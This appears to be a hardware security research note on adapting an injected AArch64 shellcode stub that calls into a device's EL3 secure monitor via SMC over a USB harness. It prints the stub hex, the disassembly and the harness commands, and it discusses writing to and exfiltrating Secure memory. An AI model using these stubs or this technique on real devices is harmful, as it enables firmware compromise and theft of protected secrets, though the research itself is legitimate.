# round59 04: diagnostic stub adapted for the matrix

Offline: the stubs were generated and disassembled with capstone, not executed
on device. Tool: `tools/diag_smc_matrix.py`.

## 4.1 what the item 1 stub did

`/tmp/diag_smc.py` used (`SCRATCH=0x37800000`, `RESULT=0x37800800`,
`false` handler at `0x37f616d0`):

```text
STUB1 = 00 08 80 d2 | 01 21 a0 d2 | 02 30 a0 d2 | e3 00 80 d2
        a6 67 18 94 | 04 00 81 d2 | 04 f0 a6 f2 | 80 00 00 f9
        c0 03 5f d6

0x37800000: mov x0,#0x40        ; cmd site1
0x37800004: mov x1,#0x1080000   ; buf
0x37800008: mov x2,#0x1800000   ; len
0x3780000c: mov x3,#7           ; opt
0x37800010: bl 0x37e19ea8       ; wrapper -> SMC 0x820000ff
0x37800014: mov x4,#0x800
0x37800018: movk x4,#0x3780,lsl#16   ; x4 = RESULT
0x3780001c: str x0,[x4]         ; only X0!
0x37800020: ret
```

The plan states "returns x0..x3 in scratch readable by MREAD". The actual code
only saves X0. For the matrix this is insufficient: X1/X2/X3 may contain the
return status/pointer and need to be read.

## 4.2 adapted stub

Same injection point (`false` handler) and same RESULT. Changes:

1. build X0..X3 with `movz`/`movk` (supports 64-bit addresses such as
   `0xD9013F00`);
2. `bl` recalculated from the actual stub position (the offset changes when an
   argument requires two instructions);
3. `stp x0,x1,[x4]` + `stp x2,x3,[x4,#0x10]`: 0x20 B in RESULT, read in one
   shot by MREAD;
4. `bl` target parameterized: wrapper `0x37e19ea8` (0xff) or bare stub
   `0x37e8bba0` (0x60..0x65).

```text
0x37800000: mov  x0,#cmd          (MOVZ/MOVK depending on the value)
...
            bl   <wrapper|smc stub>
            mov  x4,#0x800
            movk x4,#0x3780,lsl#16
            stp  x0,x1,[x4]
            stp  x2,x3,[x4,#0x10]
            ret
```

Size: 40 B (cases with 16-bit args) to 44 B (SRAM / 0x820000xx ids). Fits in
`SCRATCH[0:0x40]`. `RESULT[0:0x20]` is zeroed before and after; it does not
collide with the code scratch.

Generated example, row `ff40-ctrl-ns`:

```text
00 08 80 d2 01 21 a0 d2 02 02 a0 d2 e3 00 80 d2
a6 67 18 94
04 00 81 d2 04 f0 a6 f2
80 04 00 a9 82 0c 01 a9 c0 03 5f d6
```

Generated example, row `ff40-bl31-win` (buf = 0x05100000):

```text
00 08 80 d2 01 a2 a0 d2 22 00 a0 d2 e3 00 80 d2
a6 67 18 94
04 00 81 d2 04 f0 a6 f2
80 04 00 a9 82 0c 01 a9 c0 03 5f d6
```

All 12 stubs were disassembled back and the `bl` matches the target.

## 4.3 tool

```text
python3 tools/diag_smc_matrix.py generate        # offline only, prints hex + disasm
python3 tools/diag_smc_matrix.py run <row>        # requires stage 16 + USB
```

`run` uses the same harness as item 1: `optimus.find()` + `identify()`,
`false/true` oracle, `poke` via WRITE 0x01, `fill64` via FILL 0x03,
`dcache flush` before and after, RESULT readback via MREAD, and a `finally`
that restores the handler, scratch, and RESULT and revalidates the oracle. The
`storage61-ctrl` / `storage62-ctrl` rows are skeletons: they call the bare SMC
with X1/X2/X3 = 0 because the staging bases come from BL33 globals, not from
registers (03.3).

## 4.4 limits

- `run` was NOT executed. Direct-call stability is low: one session worked, the
  following ones crashed the gadget (plan, item 1). One row per session, with a
  power cycle between them.
- For S1/S2/S3, there is no way to read the destination via MREAD (it is
  Secure). The available evidence is X0 in RESULT + gadget survival. Do not
  claim "write confirmed" without an indirect reader: if the gadget survives
  and X0=0, the interpretation is "WRITE TO EL3 WITHOUT FAULT", not "verified
  bytes".
- Content confirmation would require a second read mechanism for the target;
  MREAD cannot read S1/S2/S3 because they are Secure.
- If the goal becomes exfiltration of secure memory, the current stub only
  returns registers; a stub that reads `buf` and returns it via RESULT would be
  needed, and that depends on MREAD being able to read the target, which it
  cannot for S1+.
